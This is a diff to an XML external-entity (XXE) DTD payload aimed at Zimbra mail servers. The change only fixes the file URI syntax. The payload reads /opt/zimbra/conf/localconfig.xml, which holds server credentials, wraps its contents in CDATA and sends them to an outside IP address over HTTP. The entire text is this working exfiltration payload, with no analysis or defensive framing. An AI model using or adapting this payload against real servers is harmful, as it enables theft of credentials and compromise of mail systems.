@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:/opt/zimbra/conf/localconfig.xml">
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY send SYSTEM  'http://154.223.132.14/ttt/ip.php?DT=%start;%file;%end;'>">
